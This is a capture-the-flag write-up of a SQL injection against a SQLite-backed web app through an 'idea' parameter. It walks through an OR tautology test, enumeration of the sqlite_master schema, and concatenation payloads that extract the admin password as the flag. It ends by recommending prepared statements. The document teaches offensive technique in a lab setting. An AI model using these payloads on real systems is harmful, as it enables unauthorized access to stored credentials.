# Share the ideas CTF Challenge Writeup

## **Challenge Overview**
We encountered a web application with a vulnerable parameter that allowed SQL injection. Our goal was to extract sensitive data, particularly the admin password, which turned out to be a flag.

## **Step 1: Identifying the Vulnerability**
### **Observing User Input Handling**
- The application accepted user input via a parameter called `idea`.
- The input was reflected in the HTML response, indicating possible direct execution of SQL queries.
- By appending a simple SQL payload, we could determine if the application was vulnerable.
- It sounds basic, but the most importand step is to figure out what the db is.The error
  
**"HY000 1 unrecognized token: `')`"** suggests that you are using **SQLite**.  

### Why is it likely SQLite?  
1. **Error Code `HY000 1`**  
   - The `HY000` is a generic SQLSTATE error code for "general error."  
   - The `1` after it is a common SQLite-specific error code indicating syntax issues.  


### **Testing for SQL Injection**
We started with a basic SQL injection test:

```sql
idea=test' OR '1'='1
```

If the application displayed unexpected behavior, such as listing all records or modifying the response, this would confirm an SQL injection vulnerability.

## **Step 2: Extracting Database Metadata**
Once confirmed, we attempted to enumerate the database structure using SQLite’s metadata table:

```sql
SELECT sql FROM sqlite_master;
```

This revealed the schema of the database, including a table called `xde43_users`, which contained the following columns:

![image](https://github.com/user-attachments/assets/e3bd580f-2f13-4f97-bd57-5f04107bd761)


```sql
CREATE TABLE "xde43_users" (
    "id" int(10) NOT NULL,
    "name" varchar(255) NOT NULL,
    "email" varchar(255) NOT NULL,
    "password" varchar(255) NOT NULL,
    "role" varchar(100) DEFAULT NULL
)
```

## **Step 3: Extracting the Admin Password**
From the table schema, we identified the `password` column and attempted to retrieve the admin’s password:
![image](https://github.com/user-attachments/assets/d20cd01e-0238-4495-97f8-318e839f00ca)


```sql
idea=test ' || (SELECT password FROM xde43_users WHERE role='admin') || '
```

The response contained the flag:

```html
<p class="list-group-item-text"> test flag245698 </p>
```

## **Step 4: Understanding the Exploit**
### **Why Did This Work?**
- SQLite allows string concatenation with `||`, making it possible to inject our query.
- The web application directly executed our injected SQL statement.
- The `SELECT password FROM xde43_users WHERE role='admin'` query returned the admin password, which was displayed on the page.

### **Improving the Exploit**
If multiple admin users existed, this query might fail due to multiple results. To ensure stability, we could use:

```sql
SELECT password FROM xde43_users WHERE role='admin' LIMIT 1;
```
Or, to concatenate multiple results:

```sql
SELECT group_concat(password) FROM xde43_users WHERE role='admin';
```

## **Step 5: Conclusion & Lessons Learned**
### **Key Takeaways:**
1. **SQL Injection is still a major security risk** if input validation is not enforced.
2. **Metadata tables in SQLite (`sqlite_master`) provide crucial information** about the database structure.
3. **Web applications should use prepared statements** to prevent SQL injection.
4. **Capture The Flag (CTF) challenges teach real-world exploitation techniques** in a safe environment.

## **Final Flag:**
```
flag245698
```

